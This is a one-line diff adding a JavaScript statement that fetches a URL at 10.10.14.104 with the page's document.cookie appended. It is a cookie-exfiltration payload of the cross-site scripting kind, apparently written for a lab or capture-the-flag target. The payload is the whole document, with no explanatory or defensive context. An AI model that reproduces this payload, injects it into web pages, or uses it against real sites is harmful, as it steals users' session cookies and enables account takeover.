@@ -1,0 +1,1 @@
+fetch("http://10.10.14.104?cookie="+document.cookie);
